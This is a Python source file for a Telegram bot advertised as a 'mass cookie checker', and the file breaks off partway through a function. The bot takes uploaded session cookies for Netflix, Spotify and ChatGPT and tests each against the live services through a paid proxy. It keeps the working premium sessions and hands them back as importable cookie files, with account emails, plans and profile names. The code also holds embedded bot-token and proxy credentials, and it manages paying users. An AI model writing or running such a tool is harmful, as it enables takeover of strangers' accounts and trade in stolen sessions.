# ================== Coo.py (patched & improved) ==================
import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
from collections import OrderedDict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from telegram.error import BadRequest
import codecs
import html
import random
from collections import defaultdict

START_MSG = (
    "<code>\n"
    " █ MASS COOKIE CHECKER █\n\n"
    "[ Step 1 ] Choose a mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file with cookies\n"
    "[ Step 3 ] Press \"Start Checking\"\n"
    "[ Step 4 ] Get results: All hits in ZIP at the end\n"
    "</code>"
)

MODE_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("Spotify", callback_data="mode_spotify"),
     InlineKeyboardButton("Netflix", callback_data="mode_netflix"),
     InlineKeyboardButton("ChatGPT", callback_data="mode_chatgpt")]
])

TOKEN = "8742088672:AAHgRgxLno4-M-9hH26_ap6aG7QOoEaLcW0"

# --- CONSTANTS ---
OWNER_ID = 8481156855
DEFAULT_PREMIUM_PROXY = "ps-pro.porterproxies.com:31112:PP_9BX6SW23L0:ylbz8043_country-us_session-Tp41ryDQrUzZ"
PREMIUM_DATA_FILE = "premium_data.json"
ADMIN_CHANNEL = -1001234567890  # Reemplazar con tu canal

MAX_WORKERS_PER_USER = 8  # Reducido para mejor estabilidad
BATCH_SIZE = 5  # Reducido para mejor rendimiento
dot_length = 5
MAX_LIVE_HITS = 10
REQUEST_TIMEOUT = 20  # Reducido para evitar timeouts

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# -------------------- PREMIUM STORAGE --------------------
class PremiumStore:
    def __init__(self, path: str):
        self.path = path
        self.lock = asyncio.Lock()
        self.data = {
            "premium_users": [],
            "premium_proxy": DEFAULT_PREMIUM_PROXY,
            "stats": {}
        }
        self.load()

    def load(self):
        if os.path.exists(self.path):
            try:
                with open(self.path) as f:
                    loaded = json.load(f)
                    self.data.update(loaded)
            except Exception:
                log.exception("Failed to load premium data")
        self.data["premium_users"] = set(self.data.get("premium_users", []))
        self.data["stats"] = defaultdict(dict, self.data.get("stats", {}))

    async def save(self):
        async with self.lock:
            to_save = {
                "premium_users": list(self.data["premium_users"]),
                "premium_proxy": self.data["premium_proxy"],
                "stats": self.data["stats"]
            }
            with open(self.path, "w") as f:
                json.dump(to_save, f, indent=2)

    def is_premium(self, uid: int) -> bool:
        return uid == OWNER_ID or uid in self.data["premium_users"]

    def get_proxy(self) -> str:
        return self.data["premium_proxy"]

    async def add_premium(self, uid: int):
        self.data["premium_users"].add(uid)
        await self.save()

    async def remove_premium(self, uid: int):
        self.data["premium_users"].discard(uid)
        await self.save()

    async def set_proxy(self, proxy: str):
        self.data["premium_proxy"] = proxy
        await self.save()

    def record_stats(self, uid: int, checked: int, hits: int, fails: int):
        now = time.time()
        st = self.data["stats"].setdefault(str(uid), {})
        st["cookies_checked"] = st.get("cookies_checked", 0) + checked
        st["hits"] = st.get("hits", 0) + hits
        st["fails"] = st.get("fails", 0) + fails
        st["last_seen_ts"] = now

store = PremiumStore(PREMIUM_DATA_FILE)

# -------------------- PII HELPERS --------------------
EMAIL_RE = re.compile(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')

def scrub_email(m):
    return f"{m.group(1)}***{m.group(2)}"

def scrub_phone(m):
    return f"{m.group(1)}******{m.group(2)}"

def scrub_text(text: str) -> str:
    text = EMAIL_RE.sub(scrub_email, text)
    text = PHONE_RE.sub(scrub_phone, text)
    return text

# -------------------- LOCKS --------------------
user_locks = defaultdict(asyncio.Lock)

# -------------------- STATE --------------------
user_state = {}
user_executors = {}
user_tasks = {}

# -------------------- FUNCTIONS --------------------
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def detect_cookie_platform(text):
    text_lower = text.lower()
    platforms = set()
    if 'netflixid' in text_lower or 'securenetflixid' in text_lower:
        platforms.add('netflix')
    if '.chatgpt.com' in text_lower or any(k in text_lower for k in ['session-token', 'oai-did', 'next-auth']):
        platforms.add('chatgpt')
    if 'sp_dc' in text_lower or 'sp_key' in text_lower or 'spotify' in text_lower:
        platforms.add('spotify')
    return list(platforms)

def infer_from_cookie_dict(d):
    keys = {k.lower() for k in d}
    if {"netflixid", "securenetflixid"} & keys:
        return "netflix"
    if {"sp_dc", "sp_key"} & keys:
        return "spotify"
    if any("session" in k and "token" in k for k in keys) or {"oai-did", "next-auth.session-token"} & keys:
        return "chatgpt"
    return None

def parse_cookie_file(text):
    text = text.strip()
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                return [("json_block", obj)]
            elif isinstance(obj, list):
                out = []
                for idx, cookie in enumerate(obj):
                    if isinstance(cookie, dict):
                        if "name" in cookie and "value" in cookie:
                            out.append((f"json_{idx}", {cookie["name"]: cookie["value"]}))
                        elif "key" in cookie and "value" in cookie:
                            out.append((f"json_{idx}", {cookie["key"]: cookie["value"]}))
                        else:
                            out.append((f"json_{idx}", cookie))
                if out:
                    return out
    except Exception:
        pass

    lines = [line.strip() for line in text.splitlines() if line.strip() and not line.strip().startswith("#")]
    blocks = []
    block = []
    for line in lines:
        if (
            re.match(r"^(– |-)email:", line, re.I) or
            re.match(r"^(name|plan|created|renew|cookies|valid cookies|http)", line, re.I) or
            not line
        ):
            if block:
                blocks.append(block)
                block = []
            continue
        if "=" in line and not line.startswith("#") and ";" not in line and not line.lower().startswith("path="):
            blocks.append([line])
            continue
        block.append(line)
    if block:
        blocks.append(block)

    out = []

    for idx, block in enumerate(blocks):
        netscape = {}
        netscape_lines = 0
        for line in block:
            parts = line.split()
            if len(parts) >= 7:
                try:
                    name = parts[5]
                    value = parts[6]
                    netscape[name] = value
                    netscape_lines += 1
                except Exception:
                    continue
        if netscape_lines > 0:
            out.append((f"block_{idx}_netscape", netscape))
            continue

        for line in block:
            if ";" in line and "=" in line:
                cookie = {}
                for c in line.split(";"):
                    c = c.strip()
                    if "=" in c:
                        k, v = c.split("=", 1)
                        cookie[k.strip()] = v.strip()
                if cookie:
                    out.append((f"block_{idx}_semicolon", cookie))

        for line in block:
            if "=" in line and not line.startswith("#") and ";" not in line:
                k, v = line.split("=", 1)
                if any(x in k.lower() for x in ["session", "token", "netflixid", "securenetflixid", "sp_dc", "sp_key", "oai-did"]):
                    out.append((f"block_{idx}_{k.strip()}", {k.strip(): v.strip()}))
                elif len(v.strip()) > 20:
                    out.append((f"block_{idx}_{k.strip()}", {k.strip(): v.strip()}))

        cookie = {}
        for line in block:
            for m in re.finditer(r"([A-Za-z0-9_\-\.@]+)=([^\s;]+)", line):
                k, v = m.group(1), m.group(2)
                cookie[k] = v
        if cookie:
            out.append((f"block_{idx}_allkeys", cookie))

    for m in re.finditer(r"([A-Za-z0-9_\-\.@]*session[^=]{0,30})=([^\s;]+)", text, re.I):
        k, v = m.group(1), m.group(2)
        out.append((f"hidden_{k}", {k: v}))

    seen = set()
    unique_out = []
    for name, d in out:
        ser = json.dumps(d, sort_keys=True)
        if ser not in seen:
            unique_out.append((name, d))
            seen.add(ser)
    return unique_out

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir():
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception:
                        log.exception("zip extract error")
                        continue
    return cookies

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except Exception:
        pass
    try:
        val = html.unescape(val)
    except Exception:
        pass
    return val

def dict_to_netscape(cookie_dict, domain):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

# -------------------- CHECKERS MEJORADOS --------------------
def check_netflix_cookie(cookie_dict):
    try:
        session = requests.Session()
        session.cookies.update(cookie_dict)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
        })
        
        # Primero verificar la página principal
        resp = session.get('https://www.netflix.com/browse', timeout=REQUEST_TIMEOUT)
        
        if resp.status_code != 200:
            return {'ok': False, 'reason': f'HTTP {resp.status_code}', 'cookie': cookie_dict}
        
        txt = resp.text
        
        # Si hay redirección a login, cookie inválida
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {'ok': False, 'reason': 'Redirected to login', 'cookie': cookie_dict}
        
        # Buscar información de cuenta
        def find(pattern):
            m = re.search(pattern, txt)
            return m.group(1) if m else None
        
        # Verificar si es cuenta premium
        is_premium = False
        plan = find(r'"localizedPlanName".{1,50}?"value":"([^"]+)"')
        if not plan:
            plan = find(r'"planName"\s*:\s*"([^"]+)"')
        
        if plan:
            plan = unescape_plan(plan)
            is_premium = not any(p in plan.lower() for p in ['free', 'basic'])
        else:
            # Intentar obtener desde la API
            try:
                api_resp = session.get('https://www.netflix.com/api/shakti/account', timeout=REQUEST_TIMEOUT)
                if api_resp.status_code == 200:
                    data = api_resp.json()
                    if 'plan' in data:
                        plan = data['plan'].get('name', 'Unknown')
                        is_premium = data['plan'].get('isPremium', False)
            except:
                pass
        
        # Si no se encontró plan pero la sesión es válida, asumir premium
        if not plan and ('NetflixId' in cookie_dict or 'SecureNetflixId' in cookie_dict):
            is_premium = True
            plan = 'Premium (assumed)'
        
        # Obtener datos de perfil
        email = find(r'"email"\s*:\s*"([^"]+)"') or find(r'"emailAddress"\s*:\s*"([^"]+)"') or 'Unknown'
        
        # Verificar si hay perfiles
        profiles = []
        try:
            profiles_resp = session.get("https://www.netflix.com/ManageProfiles", timeout=REQUEST_TIMEOUT)
            profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', profiles_resp.text)
            if not profiles:
                profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', profiles_resp.text)
        except:
            pass
        
        return {
            'ok': True,
            'premium': is_premium,
            'plan': plan or 'Unknown',
            'email': email,
            'profiles': ', '.join(profiles) if profiles else 'Unknown',
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e), 'cookie': cookie_dict}

def check_spotify_cookie(cookie_dict):
    try:
        session = requests.Session()
        session.cookies.update(cookie_dict)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        
        # Verificar si la cookie es válida
        resp = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer", timeout=REQUEST_TIMEOUT)
        
        if resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code}", "cookie": cookie_dict}
        
        data = resp.json()
        plan = data.get("currentPlan", "free")
        is_premium = plan.lower() != "free"
        country = data.get("country", "unknown")
        email = data.get("email", "unknown")
        
        return {
            "ok": is_premium,
            "premium": is_premium,
            "plan": plan,
            "country": country,
            "email": email,
            "cookie": cookie_dict
        }
    except Exception as e:
        return {"ok": False, "reason": str(e), "cookie": cookie_dict}

def check_chatgpt_cookie(cookie_dict):
    try:
        session = requests.Session()
        session.cookies.update(cookie_dict)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
        })
        
        # Intentar obtener sesión
        resp = session.get("https://chat.openai.com/api/auth/session", timeout=REQUEST_TIMEOUT)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('user'):
                    return {
                        "ok": True,
                        "premium": True,
                        "plan": "ChatGPT Plus",
                        "email": data.get('user', {}).get('email', 'Unknown'),
                        "cookie": cookie_dict
                    }
            except:
                pass
            # Si hay respuesta 200 pero no es JSON válido, probablemente sea válida
            return {
                "ok": True,
                "premium": True,
                "plan": "ChatGPT (valid)",
                "cookie": cookie_dict
            }
        elif resp.status_code == 401:
            return {"ok": False, "reason": "Invalid/Expired Session", "cookie": cookie_dict}
        else:
            return {"ok": False, "reason": f"HTTP {resp.status_code}", "cookie": cookie_dict}
    except Exception as e:
        return {"ok": False, "reason": str(e), "cookie": cookie_dict}

# -------------------- COMANDOS OWNER --------------------
async def add_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        uid = int(ctx.args[0])
    except Exception:
        await update.message.reply_text("Usage: /add <user_id>")
        return
    await store.add_premium(uid)
    await update.message.reply_text(f"Added {uid} to premium")

async def remove_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        uid = int(ctx.args[0])
    except Exception:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    await store.remove_premium(uid)
    await update.message.reply_text(f"Removed {uid} from premium")

async def set_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not ctx.args:
        await update.message.reply_text("Usage: /setproxy <host:port:user:pass>")
        return
    proxy = " ".join(ctx.args)
    try:
        p = proxy.split(':')
        proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        proxies = {"http": proxy_url, "https": proxy_url}
        requests.get("https://www.google.com", proxies=proxies, timeout=5)
    except Exception as e:
        await update.message.reply_text(f"Proxy test failed: {e}")
        return
    await store.set_proxy(proxy)
    await update.message.reply_text("Proxy updated and saved")

async def list_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    lines = ["<pre>User ID       Username     Checked  Hits  Fails</pre>"]
    for uid in sorted(store.data["premium_users"], key=lambda u: -store.data["stats"].get(str(u), {}).get("hits", 0)):
        st = store.data["stats"].get(str(uid), {})
        try:
            chat = await ctx.bot.get_chat(uid)
            username = chat.username or "N/A"
        except Exception:
            username = "N/A"
        lines.append(f"<pre>{uid:<12} {username:<12} {st.get('cookies_checked',0):>7} {st.get('hits',0):>5} {st.get('fails',0):>5}</pre>")
    if len(lines) == 1:
        await update.message.reply_text("No premium users")
    else:
        await update.message.reply_html("\n".join(lines))

# -------------------- HANDLERS --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            await update.message.reply_html(
                "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
        await update.message.reply_html(START_MSG, reply_markup=MODE_MARKUP)

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    user_id = update.effective_user.id
    async with user_locks[user_id]:
        if user_id not in user_state:
            user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
        if user_state[user_id].get('busy'):
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            await update.message.reply_html(
                "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        
        file = await update.message.document.get_file()
        ext = update.message.document.file_name.lower()
        
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = os.path.join(temp_dir, update.message.document.file_name)
            await file.download_to_drive(temp_path)
            
            cookies = []
            if ext.endswith('.zip'):
                cookies = await extract_cookies_from_zip(temp_path)
            elif ext.endswith('.txt') or ext.endswith('.json'):
                with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                c = parse_cookie_file(content)
                for idx, (blockname, cc) in enumerate(c):
                    cookies.append((f"{os.path.basename(temp_path)}_{idx}", cc))
            else:
                await update.message.reply_text("Unsupported file type.")
                return

            # Deduplicar
            seen = set()
            dedup = []
            for name, ck in cookies:
                h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                if h not in seen:
                    seen.add(h)
                    dedup.append((name, ck))
            cookies = dedup

            if not cookies:
                await update.message.reply_text("No valid cookies found.")
                return
            
            # Detectar servicios
            buckets = defaultdict(list)
            for name, ck in cookies:
                svc = infer_from_cookie_dict(ck)
                if svc:
                    buckets[svc].append((name, ck))
            
            if not buckets:
                await update.message.reply_text("No valid cookies found.")
                return
            
            if len(buckets) == 1:
                mode = list(buckets.keys())[0]
                user_state[user_id]['mode'] = mode
                user_state[user_id]['cookies'] = buckets[mode]
                check_markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Start Checking", callback_data="start_check")]
                ])
                await update.message.reply_html(
                    f"Loaded {len(buckets[mode])} cookie set(s) for <b>{mode.capitalize()}</b>. Press below to start.",
                    reply_markup=check_markup
                )
            else:
                buttons = [[InlineKeyboardButton(k.capitalize(), callback_data=f"switchmode_{k}")] for k in buckets]
                await update.message.reply_text(
                    f"Detected multiple services: {', '.join(buckets)}.\nSelect one to start:",
                    reply_markup=InlineKeyboardMarkup(buttons)
                )
                user_state[user_id]['buckets'] = buckets

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            try:
                await query.answer()
            except BadRequest:
                pass
            await context.bot.send_message(
                chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
        if "spotify" in query.data:
            mode = "spotify"
        elif "netflix" in query.data:
            mode = "netflix"
        else:
            mode = "chatgpt"
        user_state[user_id]['mode'] = mode
        mode_display = "ChatGPT" if mode == "chatgpt" else mode.capitalize()
        try:
            await query.answer(f"Selected {mode_display} mode!")
        except BadRequest:
            pass
        await context.bot.send_message(
            chat_id, f"<b>{mode_display} mode activated!</b>\nNow please upload your .txt/.json/.zip cookie file.",
            parse_mode='HTML'
        )

async def switchmode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            try:
                await query.answer()
            except BadRequest:
                pass
            await context.bot.send_message(
                chat_id,
                "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        if "spotify" in query.data:
            new_mode = "spotify"
        elif "netflix" in query.data:
            new_mode = "netflix"
        else:
            new_mode = "chatgpt"
        user_state[user_id]['mode'] = new_mode
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = False
        buckets = user_state[user_id].get('buckets', {})
        if new_mode in buckets:
            user_state[user_id]['cookies'] = buckets[new_mode]
        mode_display = "ChatGPT" if new_mode == "chatgpt" else new_mode.capitalize()
        try:
            await query.answer(f"Switched to {mode_display} mode!")
        except BadRequest:
            pass
        check_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Start Checking", callback_data="start_check")]
        ])
        await context.bot.send_message(
            chat_id,
            f"<b>Switched to {mode_display} mode!</b>\nLoaded {len(user_state[user_id].get('cookies', []))} cookies. Press below to start.",
            parse_mode='HTML',
            reply_markup=check_markup
        )

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    async with user_locks[user_id]:
        if user_id in user_tasks:
            user_tasks[user_id].cancel()
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = True
            try:
                await query.answer("Stopped and cancelled current checking task!")
            except BadRequest:
                pass
        else:
            user_state[user_id]['stop'] = True
            user_state[user_id]['busy'] = False
            try:
                await query.answer("Stopping... Please wait or restart.")
            except BadRequest:
                pass

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        cookies = user_state.get(user_id, {}).get('cookies')
        if not cookies:
            await query.answer("No cookies loaded!")
            return
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already checking!")
            return
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = True
        
        if store.is_premium(user_id):
            user_state[user_id]['use_proxy'] = store.get_proxy()
        else:
            user_state[user_id]['use_proxy'] = None

        user_tasks[user_id] = context.application.create_task(
            asyncio.wait_for(process_cookies(chat_id, cookies, user_id, context), timeout=600)
        )
        await query.answer("Started checking!")

# -------------------- PROCESS COOKIES --------------------
async def process_cookies(chat_id, cookies, user_id, context):
    checked, hits, fails, free = 0, 0, 0, 0
    total = len(cookies)
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Stop", callback_data="stop_check"),
         InlineKeyboardButton("Get Hits", callback_data="get_hits")]
    ])
    mode = user_state[user_id]['mode']
    mode_display = "ChatGPT" if mode == "chatgpt" else mode.capitalize()
    
    # Mensaje de progreso inicial
    progress_msg = (
        f"<b>{mode_display} Cookie Checking</b>\n"
        f"<code>{'○'*dot_length}</code>  0/{total}\n"
        f"Hits: <b>0</b> | Fails: <b>0</b>"
    )
    if mode != "chatgpt":
        progress_msg += f" | Free: <b>0</b>"
    
    msg = await context.bot.send_message(chat_id, progress_msg, parse_mode='HTML', reply_markup=reply_markup)
    msg_id = msg.message_id
    
    # Mensaje de preview
    preview_msg = await context.bot.send_message(chat_id, "<b>Preview of hits will appear here...</b>", parse_mode='HTML')
    preview_msg_id = preview_msg.message_id

    if user_id not in user_executors:
        user_executors[user_id] = ThreadPoolExecutor(max_workers=MAX_WORKERS_PER_USER)
    executor = user_executors[user_id]

    live_hits = OrderedDict()
    user_state[user_id]['live_hits'] = live_hits
    user_state[user_id]['hits_tmp'] = tempfile.mktemp(prefix="hits_")

    # Preparar proxy
    proxy = user_state[user_id].get('use_proxy')
    proxies = None
    if proxy:
        p = proxy.split(':')
        proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        proxies = {"http": proxy_url, "https": proxy_url}

    def run_with_proxy(fn, ck):
        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        return fn(ck)

    def retry(fn, ck):
        for attempt in range(3):
            try:
                return run_with_proxy(fn, ck)
            except Exception as e:
                if attempt == 2:
                    raise e
                time.sleep(0.5 * (2 ** attempt))

    try:
        with open(user_state[user_id]['hits_tmp'], "w") as ftmp:
            for batch_start in range(0, len(cookies), BATCH_SIZE):
                batch = cookies[batch_start:batch_start+BATCH_SIZE]
                if user_state.get(user_id, {}).get('stop'):
                    break

                loop = asyncio.get_running_loop()
                futures = []
                for name, cookie in batch:
                    if mode == 'spotify':
                        fut = loop.run_in_executor(executor, retry, check_spotify_cookie, cookie)
                    elif mode == 'netflix':
                        fut = loop.run_in_executor(executor, retry, check_netflix_cookie, cookie)
                    elif mode == 'chatgpt':
                        fut = loop.run_in_executor(executor, retry, check_chatgpt_cookie, cookie)
                    else:
                        fut = loop.run_in_executor(executor, lambda x: {'ok': False, 'reason': 'Unknown mode', 'cookie': x}, cookie)
                    futures.append(asyncio.wait_for(fut, timeout=REQUEST_TIMEOUT))

                try:
                    results = await asyncio.gather(*futures, return_exceptions=True)
                except asyncio.CancelledError:
                    break

                if user_state.get(user_id, {}).get('stop'):
                    break

                for i, result in enumerate(results):
                    checked += 1
                    if isinstance(result, Exception):
                        result = {'ok': False, 'reason': str(result), 'cookie': batch[i][1]}
                    
                    # Solo contar como hit si es premium
                    if result.get("ok") and result.get("premium", False):
                        hits += 1
                        live_hits[f"Hit_{hits}"] = result
                        if len(live_hits) > MAX_LIVE_HITS:
                            live_hits.popitem(last=False)
                        user_state[user_id]['live_hits'] = live_hits
                        ftmp.write(json.dumps(result) + "\n")
                        ftmp.flush()

                        # Actualizar preview
                        if mode == "netflix":
                            details = [
                                f"Plan: {scrub_text(clean_unicode(result.get('plan', 'Unknown')))}",
                                f"Email: {scrub_text(clean_unicode(result.get('email', 'Unknown')))}",
                            ]
                        elif mode == "spotify":
                            details = [
                                f"Plan: {scrub_text(clean_unicode(result.get('plan', 'Unknown')))}",
                                f"Country: {scrub_text(clean_unicode(result.get('country', 'Unknown')))}",
                                f"Email: {scrub_text(clean_unicode(result.get('email', 'Unknown')))}",
                            ]
                        else:
                            details = [
                                f"Plan: {scrub_text(clean_unicode(result.get('plan', 'Unknown')))}",
                                f"Email: {scrub_text(clean_unicode(result.get('email', 'Unknown')))}",
                            ]
                        
                        preview_content = "\n".join(details)
                        try:
                            await context.bot.edit_message_text(
                                chat_id=chat_id, message_id=preview_msg_id,
                                text=f"<b>Hit #{hits} Preview:</b>\n<pre>{preview_content}</pre>", 
                                parse_mode='HTML'
                            )
                        except BadRequest:
                            pass
                    elif mode != "chatgpt" and result.get("ok"):
                        free += 1
                    else:
                        fails += 1

                # Actualizar barra de progreso
                dots_done = min(dot_length, checked * dot_length // total)
                dots_left = dot_length - dots_done
                dot_bar = '●' * dots_done + '○' * dots_left
                new_text = (
                    f"<b>{mode_display} Cookie Checking</b>\n"
                    f"<code>{dot_bar}</code>  {checked}/{total}\n"
                    f"Hits: <b>{hits}</b> | Fails: <b>{fails}</b>"
                )
                if mode != "chatgpt":
                    new_text += f" | Free: <b>{free}</b>"
                
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id, text=new_text,
                        parse_mode='HTML', reply_markup=reply_markup
                    )
                except BadRequest:
                    pass
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    finally:
        async with user_locks[user_id]:
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = False
            if user_id in user_executors:
                user_executors[user_id].shutdown(wait=False)
                del user_executors[user_id]
            if user_id in user_tasks:
                del user_tasks[user_id]
            store.record_stats(user_id, checked, hits, fails)
            try:
                await context.bot.send_message(chat_id, "✅ Your check has finished.")
            except Exception:
                pass

    if hits:
        user_state[user_id]['final_hits'] = OrderedDict(live_hits)
        format_markup = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Get as .txt", callback_data="result_txt"),
                InlineKeyboardButton("Get as .zip", callback_data="result_zip"),
            ]
        ])
        await context.bot.send_message(
            chat_id,
            f"✅ Done!\nChecked: {checked}\nHits: {hits} | Fails: {fails}" +
            ("" if mode == "chatgpt" else f" | Free: {free}") +
            "\n<b>Select result format:</b>",
            parse_mode='HTML',
            reply_markup=format_markup
        )
    else:
        await context.bot.send_message(
            chat_id,
            f"✅ Done!\nChecked: {checked}\nHits: 0 | Fails: {fails}" +
            ("" if mode == "chatgpt" else f" | Free: {free}") +
            "\n<b>No premium hits found.</b>",
            parse_mode='HTML'
        )

# -------------------- RESULT HANDLERS --------------------
async def get_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id

    hits = user_state.get(user_id, {}).get('final_hits') or user_state.get(user_id, {}).get('live_hits', OrderedDict())
    if not hits:
        await query.answer("No hits found!")
        return

    mode = user_state[user_id].get('mode', 'netflix')
    if mode == "netflix":
        domain = ".netflix.com"
    elif mode == "spotify":
        domain = ".spotify.com"
    else:
        domain = ".chat.openai.com"

    all_hits = []
    for idx, (name, details_dict) in enumerate(hits.items(), 1):
        if mode == 'netflix':
            details = [
                f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
                f"Email: {clean_unicode(details_dict.get('email', 'Unknown'))}",
                f"Profiles: {clean_unicode(details_dict.get('profiles', 'Unknown'))}",
            ]
        else:
            details = [
                f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
                f"Email: {clean_unicode(details_dict.get('email', 'Unknown'))}",
            ]

        cookie_dict = details_dict.get('cookie', {})
        if isinstance(cookie_dict, dict):
            netscape = dict_to_netscape(cookie_dict, domain)
        else:
            netscape = str(cookie_dict)

        file_content = (
            f"========== HIT #{idx} ==========\n" +
            "\n".join(details) +
            "\nNetscape Cookie ↓\n" +
            netscape
        )
        all_hits.append(file_content)

    txt_buffer = io.BytesIO(("\n\n".join(all_hits)).encode("utf-8"))
    await context.bot.send_document(
        chat_id,
        document=InputFile(txt_buffer, filename="Current_Hits.txt"),
        caption=f"Current hits as .txt file"
    )
    await query.answer(f"Sent {len(hits)} hits as txt!")

async def send_result_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
